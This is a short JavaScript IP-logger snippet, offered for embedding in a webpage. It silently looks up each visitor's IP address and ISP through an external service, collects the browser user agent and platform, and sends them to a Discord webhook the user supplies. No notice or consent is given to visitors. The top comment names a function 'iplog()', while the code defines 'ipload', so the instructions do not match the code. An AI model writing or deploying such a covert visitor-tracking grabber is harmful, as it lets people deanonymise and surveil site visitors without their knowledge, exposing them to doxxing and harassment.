// Add this code to your webpage and use the "iplog()" function.

function ipload() {
  let iplog = {};
  fetch("https://wtfismyip.com/json")
  .then((response) => response.json())
  .then((data) => {
    let iplog = {
      ip: data.YourFuckingIPAddress,
      isp: data.YourFuckingISP,
      agent: navigator.userAgent,
      os: navigator.platform,
    };

  const load = {
    content: `**roku has detected a user**\nIP Address: ${iplog.ip}\nISP: ${iplog.isp}\nUser Agent: ${iplog.agent}\nUser OS: ${iplog.os}`
  };

// Enter your discord webhook where it says "ENTER DISCORD WEBHOOK".
// Make sure your webhook is INSIDE the speechmarks and you have not changed anything else around it.
    
  fetch("ENTER DISCORD WEBHOOK", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(load),
  })
    
  })
}
